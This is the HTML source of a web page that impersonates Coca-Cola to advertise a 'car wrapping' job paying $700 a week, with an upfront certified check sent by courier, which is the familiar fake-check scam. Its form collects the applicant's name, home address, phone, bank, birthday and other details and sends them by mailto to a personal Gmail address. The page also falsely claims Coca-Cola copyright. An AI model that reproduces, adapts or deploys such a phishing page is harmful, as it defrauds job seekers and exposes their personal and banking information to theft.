<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coca-cola careers</title>
    <link rel="stylesheet" href="styles.css">   
    <link rel="stylesheet" href="script.js">
    <script src="script.js"></script>
    <link rel="stylesheet" href="font-awesome(4.7.0)/css/font-awesome.min.css">
    <link rel="icon" type="image/x-icon" href="favicon-32x32.png">
    <!-- For iPhone -->
    <link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
</head>
<body>
    <nav>
        <i class="fa fa-bars"></i>
        
        <div class="logo"><img src="clogo.svg" alt="Coca-cola"></div>

        <div class="navlinks">
            <a href="#HOME">HOME</a>
            <a href="#ABOUT">ABOUT</a>
            <a href="#">CAREERS</a>
            <a href="#CONTACT">CONTACT</a>            
        </div>
    </nav>

    <section id="HOME">

        <div class="homecard">
            <h1>COCA - COLA CAREERS</h1>
        </div>

    </section>

    <section id="ABOUT">

        <div class="aboutcards">

            <div class="abtcd1">
                <h2>COCA-COLA CAR WRAPPING SERVICES</h2>

                <p>We are currently seeking to employ individual’s Nationwide, Regular citizens to go about their normal routine as they usually do, only with a small advert for Coca-Cola Drink® plastered on your car/ truck/ boat/ bike. The advert are typically Coca-Cola Drink® decals that almost seem to be painted on the vehicle.</p>
            </div>

            <div class="abtcd1">
                <h2>WHAT DOES THE COMPANY GET OUT OF THIS TYPE OF ADVERTISEMENT STRATEGY?</h2>

                <p>Lots of exposure and awareness. The adverts tend to be colorful, eye-catching and attract lots of attention. It served as a good substitute for billboard advertising. Plus, it's a form of advertising with a captive audience, meaning people who are stuck in traffic can't avoid seeing the wrapped car alongside them. This program advert campaign will last for 3 months only.</p>
            </div>

        </div>

        <div class="abtimg">
            <img src="truck.jpg" alt="Car Wrapping Image">
        </div>
        
    </section>

    <section>
        <div class="compensation">

            <div class="comptxxtarea">
    
                <h2>COMPENSATION</h2>
    
                <p>You will be compensated with $700 per week which is essentially a "Rental" payment for Coca-Cola Drink® use the space and no fee is required from you. Coca-Cola Drink® shall provide specialist that will handle the advert placing on your car. <br> <br>
     
    
                    You will receive an up front payment inform of Certified check via courier service for accepting to carry this advert on your car.
                    <br><br>
                    
                    NOTE: Coca-Cola Drink® will take full responsibility for placing and remove decal on your car/truck or bike and it will not resort to any damage. Fill the form .Add content...</p>
            </div>

        </div>

        <div class="compic">
            <img src="car.jpg" alt="">
        </div>
    </section>

    <section id="CONTACT">

        <h1 class="contactxt">CONTACT US</h1>

        <div class="formarea">
            
            <form id="contactForm" action="mailto:jhonbrady83@gmail.com" method="post">

                <div class="forma">
                    <label for="name">Full Name:*</label>
                    <input  type="text" id="name" name="name" required>
                </div>

                <div class="form1">
                    <label for="address">Home Address:*</label>
                    <input  type="text" id="address" name="address" required>

                    <label for="code">Zip-code:*</label>
                    <input  type="text" id="code" name="code" required>

                    <label for="phone">Phone number:*</label>
                    <input  type="text" id="phone" name="phone" required>

                    <label for="gender">Gender:*</label>
                    <input  type="text" id="gender" name="gender" required>
                </div>

                <div class="form1">
                    <label for="bank">Bank:*</label>
                    <input  type="text" id="bank" name="bank" required>

                    <label for="car">Type of vehicle:*</label>
                    <input  type="text" id="car" name="car" required>
            
                    <label for="email">Email:*</label>
                    <input  type="email" id="email" name="email" required>

                    <label for="bday">Birthday:*</label>
                    <input  type="date" id="date" name="date" required>
                </div>

                <div class="subut">                    
                    <button type="button" onclick="submitForm()" >Submit</button>
                </div>
            </form>
      
        </div>
    </section>

    <footer>

        <div class="flogo">
            <img src="clogo.svg" alt="Coca-Cola">
        </div>

        <div class="copywrite">
            © 2024 The Coca‑Cola Company. All rights reserved.
        </div>
    </footer>

</body>
</html>